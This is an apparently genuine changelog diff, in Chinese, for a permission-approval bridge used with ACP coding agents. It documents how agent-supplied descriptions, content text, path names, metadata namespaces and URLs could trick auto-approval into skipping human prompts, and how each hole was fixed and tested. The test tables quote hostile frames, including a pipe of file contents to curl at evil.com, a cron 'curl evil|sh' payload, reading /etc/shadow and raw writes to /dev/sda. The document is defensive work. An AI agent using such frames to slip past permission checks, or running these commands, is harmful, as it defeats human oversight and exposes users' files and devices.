@@ -1,3 +1,410 @@
+## [0.7.22] — 2026-10-24
+
+**接 code-buddy（`codebuddy --acp`）进 ACP 通道：它的权限请求字段名和 qoder 完全不同，
+导致工具名恒为空（GUI 显示「未知操作」）、文件目录恒为空、`allowWritePaths` 静默失效。**
+
+现场（用户实测 + 抓包取证）：code-buddy 作为子代理时**每次工具调用都弹一次授权球**，
+且请求里工具名显示为 fallback「未知操作」、目录一栏为空。
+
+真机抓到的 `session/request_permission` 原文（`params.toolCall` 的**全部键只有**
+`toolCallId` / `rawInput` / `_meta` 三个）：
+
+```json
+{"jsonrpc":"2.0","id":0,"method":"session/request_permission","params":{
+  "sessionId":"01a16966-db22-76c3-81e1-7343c0c74fed",
+  "options":[{"kind":"allow_always","name":"Always Allow","optionId":"allow_always"},
+             {"kind":"allow_once","name":"Allow","optionId":"allow"},
+             {"kind":"reject_once","name":"Reject","optionId":"reject"}],
+  "toolCall":{"toolCallId":"call_a3dfa6339227417d8f605455",
+    "rawInput":{"command":"ls …/scratch/","description":"List scratch directory contents"},
+    "_meta":{"codebuddy.ai/toolName":"Bash"}},
+  "_meta":{"codebuddy.ai/requestId":"01a16966-fe40-…","traceparent":"00-135f…"}}}
+```
+
+即：工具名在 `params.toolCall._meta["codebuddy.ai/toolName"]`（**命名空间里带点**），
+文件路径在 `rawInput.file_path`、命令在 `rawInput.command`、描述在
+`rawInput.description`；而 `kind` / `title` / `name` / `locations` / `content[]`
+**在权限请求里根本不存在**（只有 `session/update` 的 tool_call 通知里有 `title` 与
+`kind:"other"`，且 `kind` 恒为 `"other"`，零信息量）。
+
+### 改动
+
+1. **`_meta` 工具名支持「命名空间带点」的扁平键**（`lib/permission-state.js`）：
+   新增 `flatNamespacedToolNames(meta, product)` 遍历 `Object.keys(meta)`，凡以
+   `/toolName` 结尾**且命名空间归属本产品**的键，值为非空白字符串即收为候选。
+   候选顺序排在既有（嵌套命名空间 → 扁平 `toolName`）**之后**，qoder 的
+   `_meta.qoder.toolName` 取值与来源标注逐字不变。
+   另导出 `metaToolName(toolCall, product)`：只服务展示、**不过 `TOOL_NAME_SLUGS` 白名单**
+   （产品可以给它自认为对的任何名字，但那份名字不该决定能不能免弹）。
+   **归属过滤是首版实现的实测缺陷补丁**：首版只判「键名以 `/toolName` 结尾」，结果
+   `_meta['qoder/toolName']` 在 `claude-code` 的帧里也被读了出来（改动前后对比：
+   BASE=`null` → WORK=`"Write"`），等于一个产品能借别人的命名空间决定自己能否免弹，
+   破坏了本模块「各产品只读自己 `_meta` 命名空间」的既有不变式。现按 `.` 切分命名
+   空间段、归一化后必须命中本产品候选 token 才认；product 缺失/不可归一 ⇒ 一律不认
+   （fail-closed，宁可退化成「未解析」也不跨产品读）。`code-buddy` 与 `codebuddy`
+   归一后同值，故配置名与可执行名都能命中。
+2. **`describe()` 补展示兜底**（`lib/bridges/acp.js`）：`kind/title/name` 三者皆缺时
+   用 `_meta` 工具名补身份；描述优先 `rawInput.description`，为空才用
+   `rawInput.command`（截断 80 字符）。改后 Bash 帧显示
+   `"Bash | List files in scratch directory | 📁 …/scratch/"`（改前只有路径）。
+3. **`isExecuteFrame` 补第三判据**（`lib/execute-frame.js`）：`rawInput.command` 非空
+   即认定为执行类帧。原来只认 `kind` 与执行类 name/title slug，codebuddy 三者全无
+   ⇒ `extractPaths` 返回 `[]` ⇒ 目录栏为空、且路径侧任何白名单/会话记忆都用不上。
+   **保留**上面那条一票否决（`kind` 明确非执行类仍 `return false`）。
+4. **provider 白名单查表加 `providerId` 通道**（`lib/providers.js` / `lib/bridges/acp.js`
+   / `lib/index.js`）：`buildProviders` 建表的键是**配置名**（`code-buddy`），而 ACP 桥
+   传的 `product` 是**可执行名**（`codebuddy`），两者不等 ⇒ 老代码永远查空 ⇒
+   用户配了 `allowWritePaths` 却照样弹窗，且日志无任何提示。现由
+   `acpOptions.providerId = provider.name` 一路带到 `providers[providerId] || providers[product]`。
+   `product` 的值本身未改（授权键、日志文案、跨产品隔离都依赖它）。
+5. **`clientCapabilities.fs` 改为 `false`**（`lib/bridges/acp.js`）：原来声明
+   `readTextFile/writeTextFile: true`，而两个 handler 一律 `throw 'not supported'`
+   —— 声明有能力再抛错，会让产品先试一条必然失败的路。
+
+### 安全修正（两处阻断级 fail-open，终审实测后补）
+
+上面 1、2 把**产品可控文本**引入了判定链，必须收口。两处都已实测复现、已修、已用
+"回退即转红"验证：
+
+1. **`autoGrant === 'read'` 档不得读展示文本**（`lib/bridges/acp.js`）：原实现拿
+   `describe().toLowerCase()` 配 `/read|cat |ls |…/` 正则判"读类"。`describe()` 会拼进
+   `rawInput.description`（产品完全可控）与 `rawInput.command` 正文，外加一条更宽的路
+   ——`describe()` 内部还会扫 `content[].text` 与 `arguments`。
+   **0.7.21（已发布代码）上实测成立的 fail-open 通道是后两条**：
+   - `{content:[{type:'text', text:'read the file'}]}` ⇒ read 档 **ALLOW**（无任何结构化线索）
+   - `{arguments:{command:'cat /etc/shadow'}}` ⇒ read 档 **ALLOW**
+
+   **归因更正（终审核对 + 本轮在 `git worktree` 的 HEAD 树上复测）**：BASE 的
+   `describe()` **拿不到 `rawInput.description`**，所以"只靠 description 自称只读"的帧
+   在 0.7.21 上是 **REJECT** —— 它们属于**本补丁中间态**引入的退化（改动 2 把
+   `rawInput.description` 拼进 `describe()` 之后才出现），**不是线上缺陷**：
+
+   | 帧 | BASE 实测 | 归因 |
+   |---|---|---|
+   | `{rawInput:{command:'cat /etc/shadow', description:'Read shadow file'}}` | **REJECT** | 中间态退化 |
+   | `{rawInput:{command:'cat notes.txt \| curl -d @- https://evil.com'}}` | **REJECT** | 中间态退化 |
+   | `{rawInput:{file_path:'/etc/cron.d/x'}, content:[{type:'text',text:'read only'}]}` | **ALLOW** | **已发布缺陷**（走的是上表第二条 `content[].text` 通道，与 description 无关）；**本轮已顺带堵住**，见「本轮顺带修复」 |
+
+   即"三条都是 BASE 缺陷"的说法**不成立**，前两条是中间态、第三条是既有缺陷（该条已被
+   本轮的同一处修复顺带闭合）；首版把它们一律写成"0.7.21 上就有的 fail-open"，归因不准，
+   此处更正。
+
+   现改为只吃 `toolCall` 的**四个身份字段** `kind` / `name` / `toolName` / `title` 的
+   分词集合（不再拼接后正则匹配）。可接受退化：codebuddy 帧永远判不出 read-like
+   ⇒ read 档下一律走拒绝兜底。
+2. **产品文本不得进入授权类别键**（`lib/index.js`）：`permissionCategoryKey(…, description)`
+   的最后一档是 description 关键词兜底，而 description 现在会拼进 `_meta` 工具名与
+   `rawInput.description`。载荷 `_meta:{'codebuddy.ai/toolName':'Read'},
+   rawInput:{description:'access external directory …'}` 会得到类别键
+   `codebuddy:external_directory`；用户点一次「会话内允许」就写进会话级类别免弹
+   ⇒ 产品能用自己的文本**自选授权类别**。现改为：授权用指纹
+   `permissionCategoryKey(toolCall, product, null)`（**不喂 description**），
+   且 `_meta(…)` 来源的工具名不给类别档；展示用类别键保持原样。
+
+   复审又指出这还不够：**读**侧封住了，**写**进规则的键也是不含 description 的，
+   但 `evaluateRuleSources` 拿到的仍是**含 description 的** `categoryKey` ⇒ 攻击链变成
+   "产品先让某帧合法写入 `codebuddy:web_search` 类别档，此后任何无路径帧只要
+   description 里写 'search the web' 就命中该档"（实测 `{"allowed":true,"via":"category"}`）。
+   现在 `lib/index.js` 旁算 `categoryKeyAuth = permissionCategoryKey(toolCall, product, null)`
+   并把它喂给 `evaluateRuleSources`（展示/记账仍用含 description 的键）；同一帧改后
+   `allowed:false`。
+   **没有按"只认 name/toolName"一刀切**：opencode 系把权限类别放在 `title` 里，
+   `title(…)` 是 v0.6.2 起类别指纹的设计来源，一刀切会把既有功能打成回归（实测会崩
+   `web_search` 对照与 m5 两条）。`_meta` 才是本补丁新引入的来源，只封它。
+
+### 本轮复审收口（三处残留 fail-open + 一处不一致）
+
+上面 1、2 的**首版实现本身**又引入了三处新的 fail-open 与一处展示/授权错位，复审实测
+全部复现，现已逐条收口并固化为断言（回退即转红）：
+
+1. **`locations[].path` 不得参与 read 判定**（`lib/bridges/acp.js`）：首版把
+   `locations` 的路径也拼进 read 档的分词集合，于是**路径段能冒充动作名** —— 帧
+   `{locations:[{path:'/home/u/cat'}]}` 命中 `READ_TOKENS` 里的 `cat`，从 BASE=`REJECT`
+   变成 WORK=`ALLOW`。路径是授权/展示用的**客体**，不是"这是不是读操作"的证据；否则
+   产品只要把目标文件命名为 `cat`/`ls`/`read` 就能跳过人工审批。现移除 `locations[]`，
+   只认 `kind`/`name`/`toolName`/`title` 四个身份字段。
+2. **`evaluateRuleSources` 必须喂不含 description 的类别键**（`lib/index.js`）：见上文
+   安全修正第 2 条的追加段。
+3. **命名空间归属认「首段全等」，不是「任一段命中」**（`lib/permission-state.js`）：
+   首版按 `.` 切段后任一段命中即认 ⇒ 命名空间 `codebuddy.ai` 的第二段是 `ai`，于是
+   `product='ai'` 也能读出 `_meta['codebuddy.ai/toolName']` 的值（实测返回 `Bash`）。
+   一个产品只要能猜到别人的子域段名就能借别人的命名空间免弹。现只认**首段**归一后
+   全等于本产品 token；`product='ai'` / `'codebuddy.ai'` / `''` / `undefined` /
+   `'claude-code'` 一律读不到，只有 `'codebuddy'` / `'code-buddy'` 能读到。
+   （注：不是"整命名空间归一后全等"——那样 `codebuddy.ai` 会归一成 `codebuddyai`，
+   连 codebuddy 自家载荷都认不出来，属把真实形态一起否掉。）
+4. **展示与授权取键顺序必须同源**（`lib/permission-state.js`）：首版把候选顺序写了两遍
+   （授权：嵌套 → 扁平 → 点号；展示：点号 → 扁平），两形态并存时
+   `{qoder:{toolName:'Read'}, 'qoder/toolName':'Write'}` 授权取 `Read`、展示取 `Write`
+   —— 弹窗告诉用户"这是 Write"，落库的却是 `Read` 的授权键。现抽出
+   `metaToolCallNameCandidates(meta, product)` 单点定义顺序，`resolveToolName` 与
+   `metaToolName` 都调它，差异只在 `resolveToolName` 多过一道 `TOOL_NAME_SLUGS` 白名单。
+
+### 方向性说明（重要）
+
+本次同时存在**两个相反方向**的语义变化，不要混为一谈：
+
+- 改动 3/4 是 **fail-open 方向**：`extractPaths` 原本对 codebuddy 帧返回 `[]`，
+  `[]` 意味着"没有任何路径命中任何规则" ⇒ 必定弹窗（fail-closed）。现在能算出真实
+  路径 ⇒ 可能命中 provider 白名单/工作区默认/会话期记忆 ⇒ 少弹窗。
+  这与 qoder 的 `kind:'execute'` 帧**同构**（同一套 `extractPaths` 语义），
+  不是为 codebuddy 新开的口子；且危险命令门读命令字段与 `kind` 无关，`rm -rf` /
+  `npm publish` / `git push` 仍在白名单之前拦下（本轮补了专门断言，见测试）。
+- 上面两处安全修正是 **fail-closed 方向**：把产品可控文本从授权判定里摘出去。
+
+### 边界（本次**不动**）
+
+- `permission-rules.js:214-219` 的 `tools` 档不校验 paths —— 既有继承缺陷，与本次无关。
+- `describe()` 未改成"展示时不 unshift"，因为会抢占既有结构化描述的展示位。
+- codebuddy 的**权限请求频率**本身未改：`--permission-mode default` 下"写文件 + 跑命令"
+  会发 2 次请求，`acceptEdits` 1 次，`bypassPermissions` 0 次。DSH 侧 `permission:
+  interactive` 就是"每次问"，要少弹要么在 provider 配置里放 `allowWritePaths`（改动 4
+  修好后这条路才真的生效），要么用 `Always Allow`（options 里恒有 `allow_always`）。
+
+### 相对路径提取补漏（本轮收尾）
+
+改动 3 只让 codebuddy 帧**进入**了兜底扫描，扫描器本身仍只认绝对路径前缀白名单
+（`~|/Users/|/tmp/|/etc/|…`），于是 `printf 'ok' > scratch/x.txt` 这类**相对路径**
+依旧提取不到 ⇒ 目录栏为空、工作区规则不命中、每次工具调用重新弹球。
+本轮把这一层一并修掉（`lib/bridges/acp.js` 的 `PATH_TOKEN_RE` 与 `scanExecuteCommandPaths`）：
+
+1. **`PATH_TOKEN_RE` 放宽**：从「只匹配绝对路径前缀」改为按空白/引号/中文标点切分的
+   通用 token（`/[^\s"'`<>；，。、：:]+/g`）。收口靠**后置两层过滤**，不靠正则前缀。
+2. **候选条件**：token 含 `/` 或 `\`（`scratch/x.txt`、`./build/out`），**或**带文件
+   扩展名（`notes.txt`、`a.js`）；裸 basename 无后缀（`build`、`origin`）一律不提 ——
+   这是 `npm run build` / `git push origin main` 保持 `[]` 的依据。
+3. **写目标豁免 `existsSync`**（本轮实测发现的**修复不完整**）：首版把存在性校验当成
+   相对路径的唯一闸门，而**写目标天然尚不存在** —— 新建文件正是本轮要修的那个现场，
+   却被自己的闸门挡掉。现改为：重定向目标（`>` / `>>` / `2>` / `&>`）与写类命令的
+   目标参数（`touch`/`mkdir`/`rmdir`/`tee`/`truncate`/`mkfifo` 全部位置参数；
+   `cp`/`mv`/`ln`/`install`/`rsync` 末位参数）**豁免存在性校验**；其余相对路径仍要求
+   `resolve(cwd, token)` 存在。写目标位置是**语法层**证据，比"长得像文件名"可靠，
+   故不采用"凡带扩展名都豁免"（那会让 `git log v1.2` 把版本号当路径）。
+4. **`cwd` 全链路透传**：`create(cwd)` → `connect(cwd)` → `makeClient(…, cwd)` →
+   `decidePermission(…, cwd)` → `extractPaths({cwd})` → `scanExecuteCommandPaths(opts)`。
+   无 `cwd` 时相对路径不扫（退化到只认绝对路径），不静默解析到进程 cwd。
+5. **伪文件系统负向过滤**（`lib/bridges/acp.js`，`PSEUDO_FS_RE = /^\/(?:dev|proc|sys|run)(?:\/|$)/`）：
+   绝对路径**保持**无条件提取（不恢复白名单），但 `/dev`、`/proc`、`/sys`、`/run`
+   四类前缀下的 token **一律不进 paths**，且这道过滤排在所有其它条件**之前**。
+   被挡的原因是一条可复现的提权链：`> /dev/null` 是 shell 类代理近乎必现的写法 ⇒
+   `extractPaths` 产出 `/dev/null` ⇒ `suggestedDirs()`（`lib/permission-rules.js:414`）
+   对非目录取 `dirname` ⇒ 弹窗预填 **`/dev`** ⇒ 用户点「总是允许」⇒ 落一条
+   `paths:['/dev']` 目录规则 ⇒ 之后 `> /dev/sda` 这类裸设备写**自动放行**。
+   `/proc`（含 `/proc/sys/*` 内核开关）、`/sys`（内核对象树，写即改驱动/电源/热插拔）、
+   `/run`（tmpfs 运行时态：pid/socket/lock，`dirname` 会落到 `/run` 本身）同理。
+   正则锚定前缀边界，`/device`、`/procfs.txt`、`/runtime/a.txt` 不误伤。
+   **过滤位置在出口统一**：`filterPseudoFs()` 在 `extractPaths`（`lib/bridges/acp.js`）
+   对**结构化**与**命令扫描**两路结果各过一遍，`scanPathsLoose` 出口也过一遍。
+   为什么必须这样：首版只过滤了 `scanExecuteCommandPaths`，而
+   `{kind:'write', rawInput:{file_path:'/dev/sda'}}` 走**结构化**那一路原样通过 ⇒
+   `suggestedDirs()` 取 dirname ⇒ 预填 `/dev` —— 而 `rawInput.file_path` 正是本轮为
+   codebuddy Write 新接的字段，等于把洞挪到新路上。更隐蔽的是 `inferredDirs` 的来源
+   `scanPathsLoose` **独立于 `extractPaths` 再走一遍 toolCall**，其 `PATH_KEY` 分支
+   命中 `file_path` 键后不看前缀 ⇒ 只在 `extractPaths` 出口过滤时
+   `handler.paths` 已空但 `inferredDirs` 仍是 `['/dev']`（实测）。三处出口全部收口后
+   实测 `paths`/`suggestedDirs`/`inferredDirs` 三者均不含伪 FS。
+
+6. **相对路径必须落成绝对路径（终审 Blocker）**：相对路径原样返回时规则层不认 ——
+   `canonicalPath()`（`lib/permission-rules.js:53`）只对 `.`/`..` 前缀用 baseDir，
+   其余相对路径一律 `return null` ⇒ `coverage()` 判 uncovered ⇒
+   `evaluateRuleSources(workspace)` 得 `allowed:false` ⇒ **照样弹窗**。
+   更糟的是 `paths` 非空会让 category 档失效（`permission-rules.js:226` 要求
+   `paths=[]`）⇒ 既没命中 workspace、又关掉了 category 回退，**比不修更差**。
+   修法选**在 `scanExecuteCommandPaths` 出口 `resolve(cwd, raw)`**（而非在
+   `decidePermission` 统一 map，也不改 `canonicalPath`）：`suggestedDirs`
+   （`index.js:464`）与 `expandPathsWithParents`（`allowlist.js:130`）都**不传 baseDir**，
+   改规则层不通；且 `extractPaths` 的契约本就是"绝对路径集合"，贯通测试直接
+   `extractPaths → evaluateRuleSources` 也要求这一层就落绝对。存在性校验保留
+   （写目标位置豁免），故 `cat missing.txt` 仍为 `[]`。
+7. **URL 不得被当成路径（终审 Major）**：`PATH_TOKEN_RE` 以 `:` 断词，于是
+   `https://api.github.com/repos/a/b` 只剩 `//api.github.com/repos/a/b`，以 `/` 开头被当
+   绝对路径。后果一：带 URL 的帧多一条 uncovered ⇒ 规则要求全覆盖 ⇒ 多弹窗；
+   后果二（危险）：单段 `//example.com` 走 legacy 授权时 `expandPathsWithParents`
+   产出 `["/example.com","/"]`，`compileRulePath("//")` → `/` ⇒
+   `coverage(["/etc/passwd"],["//"])` 得 `allowed:true` ⇒ **会话内全盘放行**。
+   现分词前先 `stripUrls()`：`file:///tmp/x.txt` ⇒ `/tmp/x.txt`（baseline 语义，
+   此前会变 `///tmp/x.txt`）、其余 `file://host/p` 丢弃、其它 `scheme://…` 整段丢弃、
+   协议相对 `//host/path` 丢弃。另加**根路径守卫** `ROOT_PATH_RE`（`/`、`//`、盘符根）
+   在出口兜底：任何输入都不得产出根 token。
+8. **`expandPathsWithParents` 派生后过滤根 token**（`lib/allowlist.js`）：该函数才是
+   `/` 的**实际产生地** —— `path.dirname('//example.com')` 在 POSIX 下返回 `'//'`，
+   `compileRulePath('//')` 归一成 `'/'`。第 7 条的 `ROOT_PATH_RE` 挡的是**入口**
+   （不把 `//example.com` 交出来），挡不住这里**派生**出来的 `/`。现于返回前丢弃
+   纯根路径（`/`、`//`、`///`、盘符根），正常路径与其父目录不受影响
+   （`['/a/b.txt']` ⇒ `['/a/b.txt','/a']`）。
+9. **根守卫下沉到 `compileRulePath`（纵深防御）**：原语
+   `coverage(['/etc/passwd'],['//'])` 在改前是 `allowed:true`（`//` 经 realpath 归一成
+   `/`）。第 5/7/8 条都是**上游入口**过滤，属单点依赖——任何新增规则来源都可能绕过。
+   现在编译点直接返回 `null`（= 永不命中，与 `:110`/`:112` 既有契约一致，唯一调用方
+   `coverage` 已 `.filter(Boolean)`）。只拒纯根，`/a`、`/a/*`、`/a/b.txt` 的编译结果逐字不变。
+10. **`validateDeclaredPaths` 拒收 URL 形态**：`//example.com` 此前被归一成
+   `/example.com` 并放行（语义上仍是"把 URL 当路径"）；现 `^//` 与 `scheme://…`
+   一律落入 `dropped`（reason「非法路径（URL 形态）」）。顺序放在「根目录」判定之后，
+   裸 `//` 仍按「根目录」归类，既有归因不变。合法绝对路径不受影响。
+
+> 说明：`compileRulePath` 与 `validateDeclaredPaths` **都在 `lib/permission-rules.js`**，
+> 故该文件本轮**有 diff**，但改动仅限这两个函数内的守卫/拒收分支；
+> `ruleCoversRequest` 的 **tools 档（213-219 行）与其余判定函数零 diff**（见 `git diff`）。
+
+**方向性（如实披露）**：第 1–4 条是 **fail-open 方向** —— 提取到的路径变多，就更容易命中
+provider 白名单/工作区默认/会话记忆 ⇒ **少弹窗**。与 0.7.21 相比，相对路径侧从
+"一律 `[]`" 变成"存在或处于写目标位置即提取"，是**放宽**。绝对路径侧不设白名单，
+只要以 `/` 开头就纳入；第 5 条（伪文件系统）与第 7 条的根路径守卫是这批改动里的
+**fail-closed** 收紧，代价是这些前缀下的真实路径不再进集合 ⇒ 少授权 ⇒ 多弹窗。
+第 6 条（落绝对）**不改变提取集合**，只改变表示形式，作用是让规则层能认出它们 ——
+它不是放宽也不是收紧，而是让"提取到了"真正等于"能免弹"。
+
+**残余风险（未在本轮修复）**：
+
+- 假阳性类：工作目录里真实存在 `main.js` 时，`git checkout main.js` 会把它当路径。
+  仅多授权一个**确实存在**的路径，非提权。
+  （版本号形态 `git log v1.2` / `git tag 2.0.1` **已解决**：`VERSION_TOKEN_RE`
+  不把 `v?\d+(\.\d+)+` 当作"带扩展名"，实测即使 cwd 里真有 `v1.2` 文件也返回 `[]`。）
+- 相对路径写目标未做 cwd 越界校验（`> ../../etc/x` 原样返回），越界判定仍在下游规则层。
+- **已知漏提（判定为可接受，不修；方向一律 fail-closed = 多弹窗、不放行）**：
+  `writeTargetTokens` 只认重定向与写类命令（`touch`/`mkdir`/`cp`/`mv`…）的目标位置，
+  下列形态的目标**提不到路径** ⇒ `paths=[]`：
+  · `sed -i s/a/b/ Makefile`（就地改写，且目标无扩展名）；
+  · `python -c "open('x.txt','w')"`（写目标藏在字符串里）；
+  · `curl -o out.txt <url>`、`wget -O a.log <url>`（`curl`/`wget` 不在写类命令表里，
+    只有**当且仅当目标文件已存在于 cwd** 时才能靠"带扩展名 + existsSync"偶然提取到，
+    新建时一律 `[]`）；
+  · `dd of=img.iso`（`of=` 是 `dd` 的参数语法，不是重定向，`of=img.iso` 整体不是路径 token）。
+  要覆盖这些需要独立的写目标解析器（按命令语义而非语法位置），本轮不做。
+- **known limitation —— Windows 盘符路径不可达（留档不修）**：`PATH_TOKEN_RE` 以 `:`
+  断词，`C:\a\b.txt` 被切成 `C` 与 `\a\b.txt` 两段，后者不含 `/` 但有 `\` ⇒ 走相对
+  分支被 `resolve(cwd, …)` 拼成错误路径；分支内 `[A-Za-z]:[\\/]` 的绝对路径判定因此是
+  **死代码**。属既有缺陷、非本轮引入，当前平台（POSIX）无法复现，且修分词器影响面
+  大于本轮范围。将来支持 Windows 时必须先按盘符/引号上下文重写分词器。
+- **URL 形态未穷尽**：`stripUrls` 覆盖 `scheme://`、协议相对 `//host`、`file:///`；
+  不覆盖无 `//` 的 scheme（`mailto:`、`data:`、`javascript:`）与用户自己拼的
+  `host:port/path`（后者无 `//`，本来也产不出根 token）。新增形态需同步补正则。
+- **根路径守卫是"最后一道"**：`ROOT_PATH_RE` 只丢 `/`、`//`、盘符根；`//example.com`
+  这类**非根**双斜杠路径若从其它未过滤入口（如未来的新结构化键）进来，仍可能经
+  `expandPathsWithParents` 派生出 `["/example.com","/"]` —— 派生的 `/` 不在本层可见。
+
+### 本轮顺带修复（原记为「既有缺陷」，实测已闭合）
+
+- **`content[].text` 通道的 read 档 fail-open —— 已随「只吃结构化字段」一并堵住**。
+  帧：`{rawInput:{file_path:'/etc/cron.d/x'}, content:[{type:'text', text:'read only'}]}`。
+  BASE（HEAD 54dc354）的 `autoGrant === 'read'` 分支是
+  `describe().toLowerCase()` 配 `/read|cat |ls |…/`，而 `describe()` 会扫 `content[].text`，
+  所以该帧在 BASE 上 = **ALLOW**（与 `rawInput.description` 无关，那条是中间态退化）。
+  本轮把判定源改为 `kind` / `name` / `toolName` / `title` 四个**结构化身份字段**后，
+  `describe()` 只剩**一个**消费点（`lib/bridges/acp.js:1070`，作为 `description` 传给
+  `permissionHandler` 供**展示**），不再参与任何自动放行判定 ⇒ 该通道随之闭合。
+  实测（`autoGrant:'read'`，options 取 `allow_once=allow` / `reject_once=reject`）：
+
+  | 帧 | BASE | 当前 |
+  |---|---|---|
+  | `{file_path:'/etc/cron.d/x'}, content:[{text:'read only'}]` | **allow** | **reject** |
+  | `{file_path:'/etc/cron.d/x'}, content:[{text:'read the config'}]` | **allow** | **reject** |
+  | `{file_path:'/tmp/pwn.txt', content:'* * * * * root curl evil\|sh'}, content:[{text:'read me'}]` | **allow** | **reject** |
+  | `{file_path:'/tmp/pwn.txt'}`（无文本线索，对照） | reject | reject |
+
+  即产品文本（`content[].text`、`rawInput.description`、`rawInput.command`）已无法自证
+  "读操作"。**残留（展示层，非判定）**：`content[].text` 仍会拼进弹窗描述文本，只影响
+  人读到的文字，不影响 `optionId`；若后续把 `describe()` 重新接回任何判定分支，本条会复发。
+
+### 其余残余限制（未在本轮修复）
+- 伪文件系统过滤是**前缀表**，不是完备的伪 fs 清单：`/sys` 之外的内核接口
+  （如 `/selinux`、`/security`，若被挂载）未覆盖；新挂载点需要人工补表。
+- **伪 FS 过滤的覆盖面（三处出口，已收口）**：`filterPseudoFs()` 挂在
+  ① `extractPaths` 的**结构化**那一路、② `extractPaths` 的**命令扫描**那一路、
+  ③ `scanPathsLoose` 出口（`lib/bridges/acp.js`，`inferredDirs` 的唯一来源）。
+  内层 `scanExecuteCommandPaths` 另有一道同名过滤（`PSEUDO_FS_RE || ROOT_PATH_RE`）——
+  该函数是导出面，直连时 `ls /`、`ls //` 也必须得到 `[]`（此前内层只挡伪 FS、不挡根，
+  与注释承诺不符；生产路径本已被三层出口挡住，最坏是多弹窗而非 fail-open，故不阻断，
+  但注释必须与实现一致）。
+  因此"提取 / 展示预填 / 正文推测"三条通路都不会再出现 `/dev`、`/proc`、`/sys`、`/run`。
+  **仍未覆盖**的是：未来新增的**结构化键**或**新的扫描器**若绕过这三个出口，
+  以及 `compileRulePath` 之外**手工构造**的规则对象（不经编译、直接写进规则表）。
+
+### 测试
+
+`npm test`（本仓库真实读数，`node --test` 汇总行原文）：
+
+```
+# tests 714
+# pass 714
+# fail 0
+```
+
+`npm run lint` = `lint ok: 61 files`。
+
+**数字口径说明（此前两处误报，已作废）**：本仓库的 `# tests` 真实基线为
+**修前 686**（其中 `# fail 1`）、**修后 714**。此前出现过的两个数字都不成立：
+`681` 是 `scratch/work/` 施工副本的读数（该副本无 `.git`、`node_modules` 独立、
+`test/` 与真实仓库不同步，已删除）；`789` 是 `grep ✔` 的产物 —— 它把 104 个
+suite 标题一起数了进去（当时 685 条通过用例 + 104 个 suite = 789），同时漏读了
+`# fail 1`。**本文件此后一律只引 `# tests / # pass / # fail` 原文，不引对勾行数。**
+
+
+- `test/permission.test.js` +5：产品 description 写 `"Read …"` 不得放行；命令正文含
+  `"cat "` 不得放行；Write 帧 description 写 `"read only"` 不得放行；正向四种结构化
+  读类（`kind:'read'` / `name:'Read'` / `title:'read_file'` / `name:'read_file'`+content）
+  仍照旧放行；**本轮收口**：`locations[].path` 为 `/home/u/cat` / `ls` / `read` /
+  `open` / `get` 的帧一律不得判为 read-like，且 `kind:'read'` + 同类路径仍放行
+  （证明封的是路径冒充、不是把功能打死）。
+- `test/permission-state.test.js` +7（`v0.7.22 _meta 扁平点命名空间工具名`）：
+  `codebuddy.ai/toolName` 在 `codebuddy` / `code-buddy` / `CODE-BUDDY` 三种 product
+  下都取得到；**跨产品隔离**（`_meta['qoder/toolName']` 在 `claude-code` / `codebuddy`
+  帧里必须读不到，反之亦然）；product 缺失/不可归一 ⇒ 不读任何命名空间；
+  点号键仍要过 `TOOL_NAME_SLUGS` 白名单；既有来源优先级不变；**本轮收口**：
+  命名空间归属认「首段全等」（`product='ai'` / `'codebuddy.ai'` / `'claude-code'` /
+  `''` / `undefined` 均读不到 `codebuddy.ai/toolName`）；展示（`metaToolName`）与
+  授权（`resolveToolName`）在 6 组两形态并存的载荷上必须取同一个值。
+- `test/permission-handler-wiring.test.js` +6：`_meta` 来源工具名 + description 写
+  `external directory` ⇒ `sessionRules` 不增（类别档不写）但 `pending.category` 照常
+  展示；对照 `title:'web_search'`（非 `_meta` 来源）仍写类别档；源码不变量断言
+  授权用指纹必须显式传 `null`；**⑧** 白名单内路径 + `rm -rf` 仍必须弹球（含双向
+  注入"没有这道门"后会被白名单直接 `allow-always` 的对照 —— 这条钉的是"门在白名单
+  之前"这个顺序，上面那组用白名单外路径证不到）；**本轮收口**：先合法播种
+  `codebuddy:web_search` 类别档，再用"仅 description 写 search the web、无结构化线索、
+  无路径"的攻击帧，必须停在人工审批（`evaluateRuleSources` 只吃 `categoryKeyAuth`）。
+- `test/extract-paths.test.js`：`extractPaths({rawInput:{command:'cat /etc/hosts'}})`
+  的旧期望 `[]` 翻转为 `['/etc/hosts']`，并加反证（无 command 的帧仍只认结构化 path）。
+  **本轮收尾 +5**（`相对路径提取` 组，夹具改为 `mkdtempSync` 自建，不再依赖本机磁盘）：
+  重定向目标不存在仍提取（`> scratch/new.txt` / `>> logs/app.log` / `2> err.txt`）；
+  写类命令目标不存在仍提取（`mkdir -p` / `touch` 无后缀 / `cp` 末位参数）；
+  非写目标位置的不存在相对路径**不提**（`cat missing.txt`、`git log v1.2`，防豁免外溢）；
+  裸 basename 无后缀即使存在也不提（`npm run build`、`git checkout main`）；
+  无 `cwd` 时相对路径不扫。回退写目标豁免后该组**转红 2 条**（已验证）。
+  夹具改为 `fs.mkdtempSync(os.tmpdir(), …)` 自建：原版把 cwd 写死成作者本机路径并断言
+  磁盘上恰好存在 `scratch/x.txt`，属于**环境依赖型假绿**（换机即红）。
+  **伪文件系统 +8**：`cat /etc/hosts > /dev/null` ⇒ 只余 `/etc/hosts`；
+  `echo x > /dev/sda` / `dd if=… of=/dev/disk2` ⇒ `[]`；`cat /dev/null` /
+  `cat /dev/urandom` ⇒ `[]`；`/proc/self/status`、`/proc/sys/kernel/panic`、
+  `/sys/class/leds/…`、`/run/app.pid` ⇒ `[]`；反证 `/device/notes.txt`、
+  `/procfs.txt`、`/runtime/a.txt` 不被前缀误伤；**贯通（Blocker）**：`cat scratch/existing.txt`
+  与 `touch scratch/new.txt` 经 `extractPaths → evaluateRuleSources(workspace)` 断言
+  `allowed===true`、`uncovered===[]`、路径 `path.isAbsolute`，且
+  `expandPathsWithParents` 同时给出文件与父目录；`cat ./notes.txt` 不回归；
+  工作区**外**的相对/绝对路径仍 `allowed===false`。**URL（Major）**：`https`/`http`/`ssh`/
+  协议相对 `//example.com` 全部 `[]`；`file:///tmp/x.txt` ⇒ `/tmp/x.txt`；
+  7 组输入断言**永不**产出 `/` 或 `//`。
+- `test/allowlist.test.js` +3（`expandPathsWithParents` 派生后过滤）：`['//example.com']`
+  不得派生出 `/` 或 `//`；纯根输入 `['/','//','///']` ⇒ `[]`；反证 `['/a/b.txt']`
+  ⇒ `['/a/b.txt','/a']`（正常派生不受影响）。
+- 两层守卫各有独立用例钉住（历史教训：修 Blocker 时曾把两层一起删掉）：
